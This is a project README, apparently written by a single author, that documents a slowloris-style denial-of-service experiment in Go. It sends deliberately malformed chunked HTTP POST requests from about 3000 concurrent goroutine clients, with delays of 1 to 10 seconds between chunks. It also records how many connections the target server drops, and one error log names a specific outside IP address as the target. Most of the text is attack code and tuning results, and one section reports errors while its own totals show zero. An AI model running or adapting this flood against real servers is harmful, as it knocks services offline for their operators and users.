# Anti-ddos attack

Created with [ProshNad](https://github.com/ProshNad)

## Main idea
Send chunked requests with some timeout. Will connection closed or not? If not, we will try to create 3000+ clients and start them to send those requests

We have such message:

```go
msg := []string{"POST / HTTP/1.1\r\n" +
    "Host: debian\r\n" +
    "Content-Type: text/html\r\n" +
    "Transfer-Encoding: chunked\r\n" +
    "4\r\n",
    "test77776767667\r\n",
    "0\r\n",
    "\r\n",
}
```
## Results

### Send 1 chunked request with timeout between chunks

```go
con, closeFunc := newConn()
defer closeFunc()

_, err := sendChunkedRequest(con, i, time.Second*1)
if err != nil {
    log.Printf("client %d with addr %v got err: %v \n", i, con.LocalAddr(), err)
}
```
Successfully sent

### Send 3000 parallel requests with 2seconds timeout between chunks

```go
for i := 1; i < 3000; i++ {
    wt.Add(1)

    go func(i int) {
        con, closeFunc := newConn()
        defer closeFunc()

        _, err := sendChunkedRequest(con, i, time.Second*2)
        if err != nil {
            errCount++
            log.Printf("client %d with addr %v got err: %v \n", i, con.LocalAddr(), err)
        } else {
            goodCount++
        }

        wt.Done()
    }(i)
}
```
Some of them got error: `client 1325 with addr 192.168.1.83:49905 got err: can't write, err write tcp 192.168.1.83:49905->142.250.201.209:80: write: broken pipe `
It seems the server closed connection. Perhaps it has timeout for getting all request.

```shell
total errCount 0
total goodCount 2999
```

Try to set timeout between creating clients

### Send 3000 parallel requests with 10milliseconds timeout between creating clients

```go
for i := 1; i < 3000; i++ {
    wt.Add(1)

    go func(i int) {
        con, closeFunc := newConn()
        defer closeFunc()

        _, err := sendChunkedRequest(con, i, time.Second*2)
        if err != nil {
            errCount++
            log.Printf("client %d with addr %v got err: %v \n", i, con.LocalAddr(), err)
        } else {
            goodCount++
        }

        wt.Done()
    }(i)
	
	time.Sleep(time.Millisecond*10)
}
```

```shell
total errCount 0
total goodCount 2999
```

### Send 3000 parallel requests with 10milliseconds timeout between creating clients and 10 seconds between chunks
```shell
total errCount 0
total goodCount 2999
```

Let's try to modify our message: we duplicate it.

We have such message:

```go
msg := []string{"POST / HTTP/1.1\r\n" +
    "Host: debian\r\n" +
    "Content-Type: text/html\r\n" +
    "Transfer-Encoding: chunked\r\n" +
    "4\r\n",
    "test77776767667\r\n",
    "0\r\n",
    "\r\n",
	"POST / HTTP/1.1\r\n" +
	"Host: debian\r\n" +
    "Content-Type: text/html\r\n" +
    "Transfer-Encoding: chunked\r\n" +
    "4\r\n",
    "test77776767667\r\n",
    "0\r\n",
    "\r\n",
}
```

### Send 3000 parallel 2x-requests with 2seconds timeout between chunks 

```go
for i := 1; i < 3000; i++ {
    wt.Add(1)

    go func(i int) {
        con, closeFunc := newConn()
        defer closeFunc()

        _, err := sendChunkedRequest(con, i, time.Second*2)
        if err != nil {
            errCount++
            log.Printf("client %d with addr %v got err: %v \n", i, con.LocalAddr(), err)
        } else {
            goodCount++
        }

        wt.Done()
    }(i)
}
```
Some of them got error: `client 1325 with addr 192.168.1.83:49905 got err: can't write, err write tcp 192.168.1.83:49905->142.250.201.209:80: write: broken pipe `
It seems the server closed connection. Perhaps it has timeout for getting all request.

Results
```shell
total errCount 856
total goodCount 2141
```

### Send 3000 parallel 2x-requests with 5seconds timeout between chunks

```go
for i := 1; i < 3000; i++ {
    wt.Add(1)

    go func(i int) {
        con, closeFunc := newConn()
        defer closeFunc()

        _, err := sendChunkedRequest(con, i, time.Second*5)
        if err != nil {
            errCount++
            log.Printf("client %d with addr %v got err: %v \n", i, con.LocalAddr(), err)
        } else {
            goodCount++
        }

        wt.Done()
    }(i)
}
```

Results
```shell
total errCount 2756
total goodCount 234
```

Error count was increased.

### Send 3000 parallel 2x-requests with 10seconds timeout between chunks

Results
```shell
total errCount 2999
total goodCount 0
```

